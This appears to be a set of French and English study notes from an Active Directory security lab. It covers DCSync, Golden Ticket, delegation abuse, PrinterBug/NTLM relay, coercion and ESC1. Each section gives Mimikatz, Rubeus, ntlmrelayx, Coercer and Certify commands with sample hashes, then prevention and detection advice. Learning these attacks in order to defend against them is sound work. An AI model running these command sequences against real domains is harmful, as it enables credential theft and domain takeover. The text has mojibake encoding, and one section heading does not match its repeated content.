Les administrateurs remplissent ces propriÃ©tÃ©s lors de la crÃ©ation des comptes. Toutefois, une mauvaise pratique courante dans le passÃ© Ã©tait dâ€™ajouter les **mots de passe** (ou dâ€™autres informations sensibles) dans les propriÃ©tÃ©s **Description** ou **Info** des objets. Cette approche Ã©tait souvent motivÃ©e par la croyance erronÃ©e que ces propriÃ©tÃ©s Ã©taient sÃ©curisÃ©es et rÃ©servÃ©es Ã  une consultation uniquement par les administrateurs. Or, il est important de savoir que **tous les utilisateurs du domaine** peuvent lire la majoritÃ© des propriÃ©tÃ©s des objets, y compris **Description** et **Info**.

#### **Attaque**

Un attaquant peut facilement rÃ©cupÃ©rer des mots de passe stockÃ©s dans ces propriÃ©tÃ©s en utilisant un script PowerShell simple qui interroge le domaine pour rechercher des termes spÃ©cifiques dans les propriÃ©tÃ©s **Description** ou **Info** des utilisateurs.

**Exemple de script PowerShell :**

```powershell
Function SearchUserClearTextInformation {
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms) {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
```

Dans cet exemple, le script recherche le mot clÃ© "pass" dans les propriÃ©tÃ©s **Description** et **Info** pour trouver les mots de passe en clair. Si un mot de passe est trouvÃ© dans un champ, le script retourne les informations de lâ€™utilisateur.

**Exemple d'exÃ©cution du script :**

```powershell
PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"
SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi123
Info                 : 
PasswordNeverExpires : True
PasswordLastSet      : 05/12/2022 15.18.05
```

Ici, le mot de passe **Slavi123** est trouvÃ© dans le champ **Description** de l'utilisateur **bonni**.

#### **PrÃ©vention**

Pour prÃ©venir ce type de mauvaise configuration, voici quelques bonnes pratiques :

1. **Ã‰valuations continues** : Effectuer des Ã©valuations continues pour dÃ©tecter lâ€™Ã©ventuelle prÃ©sence de mots de passe dans les propriÃ©tÃ©s des objets dâ€™Active Directory.
2. **Formation des employÃ©s avec privilÃ¨ges Ã©levÃ©s** : Former les administrateurs et les utilisateurs privilÃ©giÃ©s pour Ã©viter de stocker des identifiants dans ces propriÃ©tÃ©s.
3. **Automatisation de la crÃ©ation des comptes utilisateurs** : Automatiser autant que possible la crÃ©ation des comptes utilisateurs pour Ã©viter que les administrateurs saisissent manuellement des informations sensibles, comme des mots de passe, dans les propriÃ©tÃ©s des objets.

#### **DÃ©tection**

La dÃ©tection de l'exploitation des informations sensibles dans les propriÃ©tÃ©s des objets peut Ãªtre rÃ©alisÃ©e via lâ€™analyse des **comportements des utilisateurs**. Cette mÃ©thode de dÃ©tection est plus efficace pour les **comptes administratifs** ou **comptes de service**, dont le comportement peut Ãªtre compris et surveillÃ©.

Les **Ã©vÃ©nements Ã  surveiller** incluent :

* **Event ID 4624** : Connexion rÃ©ussie, ce qui peut indiquer que les identifiants trouvÃ©s dans les propriÃ©tÃ©s des objets ont Ã©tÃ© utilisÃ©s.
* **Event ID 4625** : Tentative de connexion Ã©chouÃ©e, si lâ€™attaquant tente dâ€™utiliser les identifiants stockÃ©s en clair mais Ã©choue.
* **Event ID 4768** : RequÃªte Kerberos TGT, liÃ©e Ã  lâ€™utilisation des identifiants dans lâ€™environnement Kerberos.

**Limite de la dÃ©tection** : Lâ€™Ã©vÃ©nement **Event ID 4738** (modification dâ€™un objet utilisateur) ne permet pas dâ€™identifier directement quelles propriÃ©tÃ©s ont Ã©tÃ© modifiÃ©es ou les nouvelles valeurs des propriÃ©tÃ©s. Cela rend difficile la dÃ©tection dâ€™ajouts de mots de passe dans ces champs par les administrateurs.

#### **Honeypot**

Stocker des mots de passe dans les propriÃ©tÃ©s des objets peut Ãªtre une technique intÃ©ressante pour crÃ©er un **honeypot** dans un environnement Active Directory qui nâ€™a pas encore atteint un niveau de maturitÃ© en termes de gestion des identifiants.

**Configuration du compte honeypot** :

1. Le mot de passe est stockÃ© dans le champ **Description**, ce qui facilite sa dÃ©couverte par un attaquant.
2. Le mot de passe fourni est **incorrect** (cela permet de dÃ©tecter des tentatives de connexion Ã©chouÃ©es).
3. Le compte est **activÃ©** et possÃ¨de des **tentatives de connexion rÃ©centes**.
4. IdÃ©alement, utilisez un **compte de service**, car les administrateurs ont tendance Ã  les crÃ©er manuellement, contrairement aux comptes dâ€™utilisateurs crÃ©Ã©s par des systÃ¨mes automatisÃ©s (comme le systÃ¨me RH).
5. Le mot de passe de ce compte a Ã©tÃ© dÃ©fini **il y a plus de 2 ans**, ce qui le rend crÃ©dible aux yeux d'un attaquant.

En raison du mot de passe incorrect, vous pouvez vous attendre Ã  voir des tentatives de connexion Ã©chouÃ©es, telles que :

* **Event ID 4625** : Ã‰chec de connexion.
* **Event ID 4771** : Ã‰chec de lâ€™authentification Kerberos.
* **Event ID 4776** : Ã‰chec de la validation des identifiants NTLM.

```

## DCSync

```jsx
### **DCSync Attack in Active Directory**

#### **Description**

The **DCSync** attack allows attackers to **impersonate a Domain Controller (DC)** and perform replication with a targeted Domain Controller to extract **password hashes** from Active Directory (AD). This attack requires specific permissions, which are:

* **Replicating Directory Changes**
* **Replicating Directory Changes All**

These permissions enable the attacker to request password data from the AD environment, mimicking the behavior of a Domain Controller during replication.

The attack can be initiated by either a user or a computer, as long as the attacker has the necessary replication permissions assigned. This makes it a potent attack method for obtaining credential hashes from the AD environment, even without direct access to the domain controller itself.

#### **Attack Process**

Here is an example of how the DCSync attack works using **Mimikatz**, a popular tool for Windows post-exploitation:

##### **Step 1: Set Up the Attacker User Account**

First, the attacker needs to impersonate a user that has the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions.

* In this example, the user **Rocky** has the required permissions.
* Rockyâ€™s password is **Slavi123**.

##### **Step 2: Start a Command Shell as the Attacker User**

The attacker uses the **runas** command to launch a command shell as the user **Rocky**:

```powershell
C:\Users\bob\Downloads> runas /user:eagle\rocky cmd.exe
Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky"
```

##### **Step 3: Use Mimikatz to Perform DCSync**

Once in the command shell, the attacker uses **Mimikatz** to dump password hashes. The attacker targets the **Administrator** account in this case:

```powershell
C:\Mimikatz> mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

This command initiates the DCSync attack against the **Administrator** user in the **eagle.local** domain.

**Mimikatz Output Example:**

```plaintext
[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
```

In this example, the **NTLM hash** for the **Administrator** account is extracted. The hash is then used for potential further attacks, like **pass-the-hash**.

##### **Optional: Dump All Hashes in AD**

Alternatively, the attacker can use the `/all` parameter to dump the hashes of all user accounts in the Active Directory environment:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /all
```

This command would dump the NTLM hashes of every user in the domain, providing a broader attack surface for the attacker.

#### **Prevention**

Complete prevention of DCSync is challenging because the attack mimics standard replication operations within Active Directory. However, several mitigation measures can reduce the risk:

1. **Limit Replication Permissions**:

   * Restrict **Replicating Directory Changes** and **Replicating Directory Changes All** permissions to only trusted and necessary Domain Controllers.
   * **Remove unnecessary accounts** from these permissions, especially non-administrative or low-privileged accounts.

2. **Use a RPC Firewall**:

   * Implement a **RPC Firewall** to restrict replication requests to only trusted Domain Controllers. This can help block unauthorized replication attempts from non-DC systems.

3. **Use Managed Service Accounts (MSAs)**:

   * Use **Managed Service Accounts (MSAs)** instead of regular service accounts. MSAs reduce the need for manually managing credentials, which lowers the likelihood of exposing replication permissions to non-DC systems.

4. **Use Strong Authentication**:

   * Implement **strong authentication** mechanisms such as **multi-factor authentication (MFA)** for accounts that have replication privileges.

#### **Detection**

Detecting DCSync is possible by monitoring for specific events that are generated during the replication process. The following are important steps for detection:

1. **Monitor Event ID 4662**:

   * This event is generated whenever a replication attempt is made on a Domain Controller.
   * The event logs will contain information about the account initiating the replication and the object being replicated.

2. **Look for Replication Attempts**:

   * When an attacker uses DCSync, **Event ID 4662** will log details of the replication attempt.
   * Be on the lookout for unexpected replication requests from non-DC systems.

3. **Whitelist Trusted Systems**:

   * To reduce **false positives**, configure event monitoring systems to whitelist systems that legitimately need replication, such as **Azure AD Connect** or trusted **Domain Controllers**.

**Example of Event ID 4662 (Unauthorized DCSync Attempt):**

```plaintext
Event ID: 4662
Account Name: rocky
Object Name: DC2.eagle.local
Object Type: user
Access Mask: Replicate Directory Changes All
```

This event may indicate a **DCSync** attempt, particularly if the account initiating the replication is not authorized to perform this action.

#### **Conclusion**

The **DCSync attack** is a highly effective method for attackers to extract password hashes from Active Directory by impersonating a Domain Controller and performing replication. The attack relies on having the necessary **replication permissions** assigned to the attackerâ€™s account, which may be inadvertently granted due to misconfigurations.

```

## Golden Ticket

```jsx
### **Kerberos Golden Ticket Attack**

#### **Description**

The **Kerberos Golden Ticket** is a highly impactful attack that allows attackers to create or forge valid Kerberos tickets (TGTs) for any user in the domain. By exploiting the **krbtgt** account (which is responsible for signing all Kerberos tickets in Active Directory), attackers can forge these tickets and impersonate any user, including privileged accounts like **Domain Admins**.

In a Kerberos authentication setup, the **krbtgt** account is critical because its password hash is used by the **Key Distribution Center (KDC)** to sign all Kerberos tickets. An attacker with access to the hash of this password can create valid Kerberos TGTs, enabling the attacker to authenticate as any user in the domain, including those with domain-wide privileges.

The **Golden Ticket attack** is typically performed after the attacker has gained **Domain Admin** or equivalent privileges, allowing them to generate a persistent, high-level foothold in the domain.

#### **Attack Overview**

1. **Targeting the krbtgt Account**:

   * The **krbtgt** account is automatically created when a domain is set up. Its password is used by the KDC to sign Kerberos tickets.
   * This account is **disabled** by default, but it cannot be deleted, renamed, or enabled.
   * Possession of the **krbtgt password hash** enables an attacker to generate legitimate Kerberos TGTs.

2. **Escalating Privileges**:

   * With the **Golden Ticket**, an attacker can impersonate any user in the domain, including users from other domains in the forest.
   * The attacker can escalate privileges from a **child domain** to a **parent domain**, giving them access to the entire forest.

3. **Persistent Access**:

   * The Golden Ticket provides **long-term persistence** in the domain, allowing the attacker to maintain access even after their original compromise is detected and remediated.

#### **Steps to Perform the Golden Ticket Attack**

**Step 1: Obtain the krbtgt Hash and SID**

The first step is to obtain the **krbtgt** password hash and the **domain SID**. This can be achieved using tools like **Mimikatz** and **DCSync**.

* Use **DCSync** to dump the **krbtgt** hash and domain SID:

```powershell
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
```

**Mimikatz Output Example:**

```plaintext
SAM Username: krbtgt
Hash NTLM: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
```

The **krbtgt hash** (in this example: `db0d0630064747072a7da3f7c3b4069e`) is required for the Golden Ticket, as is the **domain SID** (`S-1-5-21-1518138621-4282902758-752445584`).

**Step 2: Generate the Golden Ticket**

Once the **krbtgt hash** and **domain SID** are obtained, the attacker can use **Mimikatz** to create a forged Kerberos Ticket Granting Ticket (TGT). The **kerberos::golden** command is used to generate the ticket.

Example command:

```powershell
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

Where:

* `/domain`: Specifies the domain name (e.g., `eagle.local`).
* `/sid`: Specifies the domain SID obtained from the previous step.
* `/rc4`: The NTLM hash of the **krbtgt** account.
* `/user`: The username for which the Golden Ticket is being created (e.g., `Administrator`).
* `/id`: The **Relative ID (RID)** of the user (e.g., `500` for **Administrator**).
* `/renewmax`: The maximum number of days the ticket can be renewed (e.g., `7`).
* `/endin`: The expiration date/time for the ticket (e.g., `8` for 8 days).
* `/ptt`: Places the forged ticket into the current ticket cache (useful for immediate use).

**Step 3: Verify the Golden Ticket**

Once the ticket is created, it can be verified using the **klist** command to see if the Golden Ticket has been properly added to the Kerberos ticket cache:

```powershell
C:\Mimikatz> klist
```

If the Golden Ticket was successfully created, you should see the forged TGT listed in the output.

#### **Prevention**

Preventing the Golden Ticket attack is difficult because it leverages the inherent trust in Kerberos tickets. However, the following steps can mitigate the attack:

1. **Block Privileged Users from Authenticating to Non-Essential Devices**:

   * Restrict privileged users from authenticating to any device that does not require their credentials, reducing the chances of their credentials being used for Golden Ticket generation.

2. **Periodically Reset the krbtgt Password**:

   * Regularly changing the **krbtgt** account password can limit the window of opportunity for attackers to exploit a compromised hash.
   * It is recommended to reset the **krbtgt** password twice, with at least **10 hours between resets**, to clear any old hashes.

3. **Enforce SIDHistory Filtering**:

   * Enabling **SIDHistory filtering** can prevent attackers from using **SIDHistory attributes** for **cross-domain escalation** (i.e., moving from a child domain to a parent domain).

4. **Implement Monitoring and Alerting for Unusual Authentication Activity**:

   * Monitor for suspicious Kerberos activity such as multiple requests for **TGTs** without prior **TGS** (Ticket Granting Service) requests, which may indicate a Golden Ticket.

#### **Detection**

1. **Monitor Event ID 4624 and 4625 for Suspicious Logons**:

   * These event IDs capture both successful and failed logon attempts. Monitor for logons from unusual or unexpected accounts, especially **Administrator** and other high-privileged accounts.

2. **Look for TGS Requests Without a Prior TGT**:

   * TGS requests that occur without a valid **TGT** may indicate the presence of a Golden Ticket.

3. **Monitor for Event ID 4675 if SIDHistory Filtering is Enabled**:

   * This event indicates **cross-domain escalation**, which can be caused by a Golden Ticket being used to impersonate an account from another domain.

4. **Check for Golden Ticket Usage**:

   * Look for evidence of **forged TGTs** in the **Kerberos ticket cache** using tools like **klist**.

```

## Kerberos Constrained Delegation

```jsx

---

### ğŸ” Description

**Kerberos Delegation** permet Ã  une application d'accÃ©der Ã  des ressources sur un autre serveur au nom d'un utilisateur, sans que cet utilisateur n'ait un accÃ¨s direct. Par exemple, un compte de service pour un serveur web peut Ãªtre dÃ©lÃ©guÃ© pour accÃ©der Ã  une base SQL, ce qui permet aux utilisateurs d'interagir avec les donnÃ©es sans avoir de droits directs sur la base.

#### Types de dÃ©lÃ©gation Kerberos dans Active Directory :

1. **Unconstrained Delegation** (non restreinte)

   * La plus permissive. Permet au compte dÃ©lÃ©guÃ© d'accÃ©der Ã  nâ€™importe quel service.
2. **Constrained Delegation** (restreinte)

   * Limite les services auxquels le compte peut se dÃ©lÃ©guer, dÃ©fini dans les attributs de lâ€™utilisateur.
3. **Resource-Based Constrained Delegation**

   * Moins utilisÃ©e, elle est configurÃ©e au niveau de lâ€™objet machine cible.

> âš ï¸ Toutes les formes de dÃ©lÃ©gation reprÃ©sentent un risque potentiel de sÃ©curitÃ©. Elles doivent Ãªtre Ã©vitÃ©es sauf nÃ©cessitÃ© absolue.

---

### ğŸ¯ Attaque : Abus de la DÃ©lÃ©gation Restreinte (Constrained Delegation)

Quand un compte est configurÃ© pour une dÃ©lÃ©gation restreinte, il peut demander des tickets Kerberos pour dâ€™autres comptes afin d'accÃ©der Ã  des services spÃ©cifiques.

#### Ã‰tapes de lâ€™attaque :

1. **Identifier les comptes configurÃ©s pour la dÃ©lÃ©gation :**

```powershell
Get-NetUser -TrustedToAuth
```

Exemple de rÃ©sultat :

```plaintext
distinguishedname       : CN=web service,CN=Users,DC=eagle,DC=local
msds-allowedtodelegateto: {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
useraccountcontrol      : TRUSTED_TO_AUTH_FOR_DELEGATION
```

2. **RÃ©cupÃ©rer le hash NTLM du mot de passe compromis (ex: `Slavi123`) :**

```powershell
.\Rubeus.exe hash /password:Slavi123
```

Sortie :

```plaintext
rc4_hmac : FCDC65703DD2B0BD789977F1F3EEAECF
```

3. **Impersonner lâ€™utilisateur â€˜Administratorâ€™ et injecter le ticket Kerberos :**

```powershell
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

4. **VÃ©rifier lâ€™injection du ticket avec `klist` :**

```powershell
klist
```

5. **Ouvrir une session distante sur le DC avec les droits de lâ€™Administrator :**

```powershell
Enter-PSSession dc1
```

---

### ğŸ›¡ï¸ PrÃ©vention

* Activer lâ€™option **"Account is sensitive and cannot be delegated"** pour les comptes Ã  privilÃ¨ges.
* Ajouter les comptes critiques au groupe **"Protected Users"**, qui empÃªche toute forme de dÃ©lÃ©gation.
* Mettre en place une politique de mot de passe robuste pour Ã©viter les attaques de type **Kerberoasting**.

---

### ğŸ” DÃ©tection

* Surveiller les **connexions suspectes** Ã  lâ€™aide de lâ€™**Event ID 4624** (logon rÃ©ussi).
* Inspecter le champ **Transited Services** dans les journaux pour identifier les processus de logon de type S4U (Service for User).

---

```

## Print Spooler & NTLM Relaying

```jsx

---

## ğŸ–¨ï¸ Print Spooler Exploitation (PrinterBug)

### ğŸ” Description

The **Print Spooler** service, enabled by default even in modern Windows systems, became a critical attack vector after the discovery of **"PrinterBug"** by Lee Christensen in 2018.

This bug leverages the functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` to **force a remote machine to authenticate to an attacker-controlled system**, sending **Kerberos TGTs** that can be relayed or harvested.

> ğŸ¯ Microsoft classified this issue as â€œby-designâ€ and **did not release a patch**.

---

### ğŸš¨ Impact

If a **Domain Controller (DC)** runs the Print Spooler service, an attacker can:

* **Relay the DCâ€™s connection** to another DC to perform **DCSync**, assuming **SMB signing is disabled**.
* Force the DC to connect to a server with **Unconstrained Delegation**, allowing **TGTs to be cached** and extracted with tools like **Mimikatz** or **Rubeus**.
* **Relay authentication** to **Active Directory Certificate Services (AD CS)** to obtain a valid **certificate impersonating the DC**.
* Abuse the connection to configure **Resource-Based Delegation**, enabling further privilege escalation.

---

### âš”ï¸ Attack Methodology

This example demonstrates **NTLM relay to perform DCSync** by redirecting the DCâ€™s Print Spooler request to another DC.

#### ğŸ› ï¸ Step-by-Step:

1. **Start NTLMRelayx**, targeting the second DC (`DC2`):

```bash
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

Sample Output:

```
[*] Servers started, waiting for connections
```

2. **Trigger the PrinterBug** using **Dementor** to make the first DC (`DC1`) authenticate to us:

```bash
python3 dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

Expected Output (even with RPC errors, the relay may succeed):

```
[*] bound to spoolss
[*] getting context handle...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR
```

3. **Check NTLMRelayx output** â€“ if successful, DCSync will return **NTLM hashes** of domain users, including privileged accounts.

---

### ğŸ›¡ï¸ Prevention

1. **Disable Print Spooler** on all critical servers (especially DCs):

   * Use **Group Policy** or PowerShell:

     ```powershell
     Stop-Service spooler
     Set-Service spooler -StartupType Disabled
     ```

2. **Registry Hardening** â€“ prevent remote RPC endpoint use:

   * Key: `HKLM\System\CurrentControlSet\Control\Print`
   * Value: `RegisterSpoolerRemoteRpcEndPoint`

     * `1`: Enabled
     * `2`: Remote access disabled

3. **Enforce SMB Signing** on DCs to prevent NTLM relays.

---

### ğŸ•µï¸ Detection

* While **PrinterBug attacks don't generate event ID 4662** (typically used for DCSync detection), they may still be spotted by:

  * Event ID **4624** â€“ look for suspicious successful logons on DCs from unusual IPs.
  * **Network connection logs** â€“ monitor outbound connections from DCs on **ports 445 and 139**.

---

### ğŸ£ Honeypot Strategy

You can deploy PrinterBug as a **honeypot** to detect lateral movement or exploitation attempts:

* **Block outbound SMB traffic** from servers (139/445) and alert on attempts.
* Set traps using decoy servers with **Print Spooler enabled** and monitor connections.

> âš ï¸ Use honeypots only if your **blue team can respond quickly**â€”they work best in **mature security environments**.

---

```

## Coercing Attacks & Unconstrained Delegation

```jsx

---

## ğŸ”“ Coercing Attacks in Active Directory

### ğŸ“Œ Description

**Coercion attacks** are a class of privilege escalation techniques in Active Directory where an attacker forces one system (usually a privileged one like a Domain Controller) to **authenticate to an attacker-controlled machine**. This allows credential theft or ticket manipulation.

Although **PrinterBug** is the most well-known example, tools like **Coercer** now support a **wide range of vulnerable RPC functions** for this purpose, significantly broadening the attack surface.

> âš ï¸ Most AD environments are **vulnerable by default** unless hardened specifically.

---

### ğŸ§¨ Impact

Once a coercion path is successful, the attacker can pivot to various **post-exploitation techniques**:

* **Relay to another DC** and perform **DCSync**, if **SMB signing is disabled**.
* Coerce a DC to connect to a server with **Unconstrained Delegation (UD)** and capture **Kerberos TGTs**.
* Relay to **AD Certificate Services** to obtain a forged certificate (usable for DCSync or lateral movement).
* Abuse **Resource-Based Delegation (RBCD)** to impersonate users on target systems.

---

### âš”ï¸ Attack Walkthrough: Capturing a TGT via Coercer

#### 1. ğŸ” Identify Unconstrained Delegation Hosts

Use **PowerView** to list machines with Unconstrained Delegation enabled:

```powershell
Get-NetComputer -Unconstrained | Select samaccountname
```

Example Output:

```
samaccountname
--------------
DC1$
SERVER01$
WS001$
DC2$
```

#### 2. ğŸ›°ï¸ Monitor for TGTs on a Compromised UD Machine

On `WS001`, run **Rubeus** to monitor incoming tickets:

```powershell
.\Rubeus.exe monitor /interval:1
```

Sample Output:

```
[*] 18/12/2022 22.37.09 UTC - Found new TGT:
User         : bob@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.09
```

#### 3. ğŸš¨ Trigger Coercion with Coercer

On the attacker machine (e.g., Kali), use **Coercer**:

```bash
Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

Expected Output:

```
[>] Pipe '\PIPE\lsarpc' is accessible!
[>] Pipe '\PIPE\spoolss' is accessible!
[+] All done!
```

#### 4. ğŸ¯ Capture the Domain Controller's TGT

Rubeus on `WS001` will now detect the DCâ€™s TGT:

```
[*] 18/12/2022 22.55.52 UTC - Found new TGT:
User         : DC1$@EAGLE.LOCAL
StartTime    : 18/12/2022 23.30.21
```

#### 5. ğŸ› ï¸ Use the TGT for Authentication

Inject the ticket with **Rubeus**:

```powershell
.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

Then, dump credentials using **Mimikatz**:

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
```

---

### ğŸ›¡ï¸ Prevention

Because Windows doesnâ€™t natively restrict coercion vectors, prevention requires proactive controls:

1. **Deploy a Third-Party RPC Firewall**
   Example: [Zero Networks RPC Firewall](https://github.com/zeronetworks/rpcfirewall)

   * Audit or block dangerous RPC functions
   * Custom blocklists for OPNUMs

2. **Block Outbound Ports 139 and 445**

   * Especially from **Domain Controllers** and sensitive servers
   * Prevents coercion responses from reaching attackers

---

### ğŸ” Detection

Detection is challenging, but possible through network and firewall monitoring:

* **Firewall Log Analysis**

  * Watch for **outbound SMB connections** (139/445) from core servers
  * Especially unexpected traffic to non-trusted machines

* **Dropped Traffic as an Alert Signal**

  * If port blocking is in place, dropped connections can indicate attack attempts

* **Third-Party Monitoring Tools**

  * The RPC Firewall mentioned above provides robust detection features for these attack vectors.

---

### ğŸ§  Final Notes

* **Coercion is not a vulnerability, but a design issue**â€”and highly effective.
* Combining **RPC firewalling** with **network egress restrictions** significantly improves defenses.
* Regularly audit **delegation settings** and **RPC exposure** in your environment.

---

```

## Object ACLs

```jsx

---

## ğŸ›¡ï¸ Attaques par Coercition dans Active Directory

### ğŸ“˜ Description

Les attaques par coercition sont devenues une mÃ©thode fiable pour **Ã©lever les privilÃ¨ges dâ€™un utilisateur standard jusquâ€™aux privilÃ¨ges dâ€™administrateur de domaine**. Dans un environnement Active Directory (AD) classique, la majoritÃ© des configurations sont vulnÃ©rables Ã  ce type dâ€™attaque.

Lâ€™exploit **PrinterBug** est lâ€™un des premiers exemples connus de coercition. Depuis, dâ€™autres fonctions RPC vulnÃ©rables ont Ã©tÃ© identifiÃ©es. Elles permettent Ã  un utilisateur du domaine de forcer un serveur distant (RemoteServer\$) Ã  sâ€™authentifier auprÃ¨s dâ€™un autre hÃ´te contrÃ´lÃ© par lâ€™attaquant. Lâ€™outil **Coercer** a Ã©tÃ© conÃ§u pour exploiter plusieurs de ces fonctions RPC.

---

### ğŸ¯ Impact

Une fois la coercition Ã©tablie, lâ€™attaquant peut effectuer diffÃ©rents types dâ€™attaques en chaÃ®ne :

* **Relai vers un autre contrÃ´leur de domaine (DC)** pour exÃ©cuter une attaque DCSync (si la signature SMB est dÃ©sactivÃ©e).
* **Forcer un DC Ã  se connecter Ã  un serveur en DÃ©lÃ©gation Non Restreinte**, capturant ainsi un TGT dans la mÃ©moire du serveur (outils : Rubeus, Mimikatz).
* **Relai vers les services de certificats Active Directory (ADCS)** pour gÃ©nÃ©rer un certificat sâ€™identifiant comme un DC.
* **Configurer une dÃ©lÃ©gation Kerberos basÃ©e sur les ressources** afin de sâ€™authentifier comme nâ€™importe quel administrateur sur la machine ciblÃ©e.

---

### ğŸ”§ MÃ©thodologie de lâ€™attaque

Dans cet exemple, lâ€™objectif est de **capturer un TGT** sur un serveur compromis configurÃ© avec la **dÃ©lÃ©gation non restreinte**, Ã  lâ€™aide de lâ€™outil **Coercer**.

#### ğŸ” Ã‰tapes :

1. **Identifier les serveurs avec DÃ©lÃ©gation Non Restreinte** (via PowerView) :

   ```powershell
   Get-NetComputer -Unconstrained | select samaccountname
   ```

   **Exemple de sortie :**

   ```
   samaccountname
   --------------
   DC1$
   SERVER01$
   WS001$
   DC2$
   ```

2. **Surveiller les tickets Kerberos avec Rubeus sur le serveur compromis (ex: WS001)** :

   ```cmd
   .\Rubeus.exe monitor /interval:1
   ```

3. **Lancer Coercer depuis une machine Kali pour forcer lâ€™authentification du DC vers WS001** :

   ```bash
   Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
   ```

   **Exemple de sortie :**

   ```
   [>] Pipe '\PIPE\lsarpc' is accessible!
   ...
   [>] Pipe '\PIPE\spoolss' is accessible!
   ...
   [+] All done!
   ```

4. **Capturer le TGT du DC sur WS001 avec Rubeus** :

   ```text
   [*] Found new TGT:
     User : DC1$@EAGLE.LOCAL
   ```

5. **Injecter le ticket capturÃ© pour sâ€™authentifier dans le domaine** :

   ```cmd
   .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
   ```

6. **Lancer une attaque DCSync avec Mimikatz** :

   ```cmd
   .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
   ```

---

### ğŸ›¡ï¸ PrÃ©vention

Windows ne permet pas nativement de surveiller ou bloquer les appels RPC sensibles. Deux approches de prÃ©vention :

* **Pare-feu RPC tiers** : des outils comme le *RPC Firewall* de Zero Networks permettent dâ€™auditer et de bloquer des fonctions RPC spÃ©cifiques.
* **Restriction des ports sortants 139 et 445** : bloquer ces ports sur les DC et serveurs critiques empÃªche le relai dâ€™authentification vers les attaquants.

---

### ğŸ” DÃ©tection

DÃ©tecter lâ€™abus de coercition via RPC reste complexe sans solutions tierces :

* **Analyse des journaux de pare-feu** : les attaques rÃ©ussies gÃ©nÃ¨rent du trafic sortant inhabituel, souvent sur le port 445.
* **DÃ©tection des connexions bloquÃ©es** : bloquer les ports mentionnÃ©s empÃªche la rÃ©ception de TGT et toute tentative gÃ©nÃ¨re une alerte utile.

---

### âœ… Conclusion

En combinant **filtrage RPC** et **blocage des ports rÃ©seau stratÃ©giques**, les organisations renforcent significativement leur sÃ©curitÃ© face aux attaques par coercition.

---

```

## PKI - ESC1

```jsx

---

## ğŸ” Attaque ESC1 â€“ Abus des Active Directory Certificate Services (AD CS)

### ğŸ“˜ Description

La recherche *Certified Pre-Owned* par SpecterOps a mis en lumiÃ¨re les **Active Directory Certificate Services (AD CS)** comme vecteur dâ€™attaque privilÃ©giÃ© en raison de nombreuses **mauvaises configurations frÃ©quentes**. Les certificats offrent un fort avantage aux attaquants :

* **ValiditÃ© longue durÃ©e** (souvent un an ou plus).
* **Les rÃ©initialisations de mots de passe** nâ€™invalident pas les certificats dÃ©jÃ  Ã©mis.
* **Des modÃ¨les mal configurÃ©s** permettent Ã  des attaquants dâ€™obtenir des certificats pour le compte d'autres utilisateurs.
* Le **compromis de la clÃ© privÃ©e dâ€™une autoritÃ© de certification** permet de forger des "certificats dorÃ©s" (Golden Certificates).

Lâ€™une des mÃ©thodes les plus notoires dâ€™Ã©lÃ©vation de privilÃ¨ge est **ESC1**, qui repose sur les caractÃ©ristiques suivantes :

* Pas dâ€™approbation ou de validation manuelle requise.
* Le modÃ¨le permet **lâ€™authentification client** (Client Authentication) ou **la connexion par carte Ã  puce**.
* Le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activÃ©, permettant Ã  lâ€™utilisateur de **fournir lui-mÃªme le nom du sujet (SAN)**.

---

### âš™ï¸ ExÃ©cution de lâ€™attaque ESC1

#### 1. Rechercher les modÃ¨les vulnÃ©rables avec **Certify** :

```powershell
.\Certify.exe find /vulnerable
```

